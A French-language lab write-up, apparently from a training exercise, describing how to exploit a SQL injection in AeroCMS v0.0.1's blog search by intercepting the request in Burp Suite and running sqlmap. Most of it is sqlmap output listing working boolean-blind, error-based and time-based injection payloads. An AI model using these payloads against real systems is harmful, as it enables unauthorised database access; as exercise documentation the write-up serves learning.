# Démarche pour exploiter la vulnébilité de AeroCMS-v0.0.1  
- Avoir Burp suite installer sur la machine physique
- Démarrage de Burp suite ;
- Ouverture du navigateur de Burp suite en cliquant sur le bouton "Open browser" et accès au site grâce  avec l'adresse :: http://zero2hero.emes.bj:8878/;
- Sur la page affichée, renseigner un quelconque élément de recherche dans la barre "Blog search";
- Dans Proxy > Intercept, mettre "Intercept is off" à "Intercept is on" et relancer la recherche;
- Récupération dans Burp suite de la requête interceptée dans un fichier texte;
- Exécution de sqlmap.
- Exécution de l'exploit.

# Résultats
## Résultats de sqlmap
	└─$ sqlmap -r request.txt -p search --technique=BTE --dbms=mariadb --level 5 --risk 3
		___
	       __H__
	 ___ ___["]_____ ___ ___  {1.7.2#stable}
	|_ -| . [(]     | .'| . |
	|___|_  [(]_|_|_|__,|  _|
	      |_|V...       |_|   https://sqlmap.org

	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

	[*] starting @ 11:23:44 /2023-05-04/

	[11:23:44] [INFO] parsing HTTP request from 'request.txt'
	[11:23:47] [INFO] testing connection to the target URL
	[11:23:48] [INFO] checking if the target is protected by some kind of WAF/IPS
	[11:23:48] [INFO] testing if the target URL content is stable
	[11:23:48] [INFO] target URL content is stable
	[11:23:48] [INFO] heuristic (basic) test shows that POST parameter 'search' might be injectable (possible DBMS: 'MySQL')
	[11:23:48] [INFO] heuristic (XSS) test shows that POST parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
	[11:23:48] [INFO] testing for SQL injection on POST parameter 'search'
	[11:23:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
	[11:23:48] [WARNING] reflective value(s) found and filtering out
	[11:23:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
	[11:23:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
	[11:23:50] [INFO] POST parameter 'search' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="result")
	[11:23:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
	[11:23:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
	[11:23:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
	[11:23:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
	[11:23:50] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
	[11:23:50] [WARNING] potential permission problems detected ('command denied')
	[11:23:50] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
	[11:23:50] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
	[11:23:50] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
	[11:23:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
	[11:23:50] [INFO] POST parameter 'search' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
	[11:23:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
	[11:24:00] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
	[11:24:00] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
	POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
	sqlmap identified the following injection point(s) with a total of 212 HTTP(s) requests:
	---
	Parameter: search (POST)
	    Type: boolean-based blind
	    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
	    Payload: search=ami' OR NOT 2635=2635-- kDbs&submit=

	    Type: error-based
	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	    Payload: search=ami' AND (SELECT 9982 FROM(SELECT COUNT(*),CONCAT(0x716b7a7a71,(SELECT (ELT(9982=9982,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uQlT&submit=

	    Type: time-based blind
	    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	    Payload: search=ami' AND (SELECT 1349 FROM (SELECT(SLEEP(5)))luVV)-- PESJ&submit=
	---
	[11:24:12] [INFO] the back-end DBMS is MySQL
	web server operating system: Linux Debian
	web application technology: Apache 2.4.56
	back-end DBMS: MySQL >= 5.0 (MariaDB fork)
	[11:24:12] [INFO] fetched data logged to text files under '/home/armelle/.local/share/sqlmap/output/localhost'

	[*] ending @ 11:24:12 /2023-05-04/

## Résultats du test
* Modification de la requête interceptée dans Burp suite
 ![Modification](/AeroCMS-0.0.1/request.jpg)

* Résultats obtenus
 ![Résultats](/AeroCMS-0.0.1/result.jpg)


